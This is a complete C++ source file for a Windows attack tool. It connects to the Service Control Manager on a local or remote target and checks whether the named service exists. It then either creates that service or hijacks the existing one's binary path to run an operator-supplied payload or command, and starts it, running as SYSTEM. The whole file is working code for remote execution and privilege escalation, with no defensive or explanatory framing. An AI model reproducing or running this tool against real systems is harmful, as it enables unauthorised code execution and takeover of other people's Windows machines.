#include <windows.h>
#include <iostream>

auto helpmenu() {
	const char* help = "\n\t\t---- Usage: ----\n\n\
> program.exe [target] [service name] [payload path/command]\n\n";
	return help;
}

//
// Modify existing service if service name specifies existing service
//
BOOL _ModifyService(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpBinaryPathName) {

	printf("[*] Modifying existing service\n");

	// Handle to specified service
	SC_HANDLE hService = OpenServiceA(hSCManager, lpServiceName, SERVICE_ALL_ACCESS);
	if (hService != NULL) {

		printf("[+] Obtained handle to service [ 0x%p ]\n", hService);

		// Change binary path name to point to payload
		if (ChangeServiceConfigA(
			hService,
			SERVICE_NO_CHANGE,
			SERVICE_NO_CHANGE,
			SERVICE_NO_CHANGE,
			lpBinaryPathName,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL) == TRUE)
		{

			printf("[+] Service modified\n");

			// Start the service
			if (StartServiceA(hService, 0, NULL) == FALSE) {

				// cleanup
				CloseServiceHandle(hService); CloseServiceHandle(hSCManager);
				printf("[-] Failed starting service\n");
				return FALSE;
			}

			printf("[+] Service started\n");
			return TRUE;
		}
	}
	else
	{
		// cleanup
		CloseServiceHandle(hService); CloseServiceHandle(hSCManager);
		printf("[-] Failed opening a handle to the service [ %s ]\n", lpServiceName);
		return FALSE;
	}


}

//
// Create the service if it doesn't exist
//
BOOL _CreateService(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpBinaryPathName) {

	printf("[*] Creating the service [ %s ]\n", lpServiceName);

	// Create the missing target service
	SC_HANDLE hService = CreateServiceA(
		hSCManager,
		lpServiceName,
		lpServiceName,
		GENERIC_ALL,				// Full access to the created service
		SERVICE_WIN32_OWN_PROCESS,  // Non-dependable service, runs as own
		SERVICE_DEMAND_START,		// On demand start == manual 
		SERVICE_ERROR_IGNORE,		// Ignore errors on service start 
		lpBinaryPathName,			// Paylod path or command
		NULL,
		NULL,
		NULL,
		NULL,						// Runs the service as SYSTEM if null
		NULL);

	if (hService != NULL) {

		printf("[+] Service created\n");
		printf("\t- Handle: [ 0x%p ]\n", hService);

		// Start service
		if (StartServiceA(hService, 0, NULL) == FALSE) {

			// cleanup
			CloseServiceHandle(hService); CloseServiceHandle(hSCManager);
			printf("[-] Failed starting service\n");
			return FALSE;
		}

		printf("[+] Service started\n");
		return TRUE;
	}
	else
	{
		// cleanup
		CloseServiceHandle(hService); CloseServiceHandle(hSCManager);
		printf("[-] Failed opening a handle to the service [ %s ]\n", lpServiceName);
		return FALSE;

	}

	return TRUE;
}

int main(int argc, char* argv[]) {

	const char* help_menu = helpmenu();
	if (argc != 4) {
		printf(help_menu);
		return EXIT_FAILURE;
	}

	char* lpMachineName = argv[1];
	char* lpServiceName = argv[2];
	char* payload = argv[3];

	BOOL bSVCExists = FALSE; // If service exists checker bool

	ENUM_SERVICE_STATUS_PROCESSA lpServices[1024] = {};

	DWORD pcbBytesNeeded = 0;
	DWORD lpServicesReturned = 0;
	DWORD ResumeHandle = 0;

	SC_HANDLE hSCManager = OpenSCManagerA(lpMachineName, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL) {
		printf("[-] Can't open a handle to service manager\n");
		printf("\tError: %d\n", GetLastError());
		CloseServiceHandle(hSCManager);
		return EXIT_FAILURE;
	}

	printf("[+] Service manager handle obtained [ 0x%p ]\n", hSCManager);

	// Enumerate all service on local/remote host
	if (EnumServicesStatusExA(
		hSCManager,
		SC_ENUM_PROCESS_INFO,
		SERVICE_WIN32,
		SERVICE_STATE_ALL,
		(BYTE*)&lpServices,
		sizeof(lpServices),
		&pcbBytesNeeded,
		&lpServicesReturned,
		&ResumeHandle,
		NULL) == FALSE)
	{

		printf("[-] Unable to enumerate services in service manager\n");
		printf("\tError: %d\n", GetLastError());
		CloseServiceHandle(hSCManager); // cleanup
		return EXIT_FAILURE;
	}
	else {
		printf("[+] Got services information\n");
		printf("\t- Total services: %d\n", lpServicesReturned); // total num of services 

		// Go through all and check if target service exists
		for (DWORD i = 0; i < lpServicesReturned; i++)
		{
			if (strcmp(lpServiceName, lpServices[i].lpServiceName) == 0) {
				printf("[+] Found existing service -> [ %s ]\n", lpServices[i].lpServiceName);
				bSVCExists = TRUE; // True when exists :)
			}
		}
	}

	if (bSVCExists == FALSE) {
		printf("[!] Service does not exist\n");
		_CreateService(hSCManager, lpServiceName, payload);
	}
	else {
		_ModifyService(hSCManager, lpServiceName, payload);
	}
}